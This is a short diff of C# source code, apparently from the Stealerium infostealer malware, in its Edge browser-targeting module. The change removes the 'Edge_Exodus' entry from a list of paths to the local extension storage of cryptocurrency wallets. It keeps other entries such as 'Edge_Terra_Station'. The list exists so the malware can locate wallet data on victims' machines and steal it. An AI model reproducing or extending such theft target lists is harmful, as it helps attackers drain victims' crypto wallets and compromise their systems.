@@ -59,12 +59,6 @@ namespace Stealerium.Target.Browsers.Edge
             },
             new[]
             {
-                "Edge_Exodus",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\jdiccldimpdaibmpdkjnbmckianbfold"
-            },
-            new[]
-            {
                 "Edge_Terra_Station",
                 Paths.Lappdata +
                 "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"
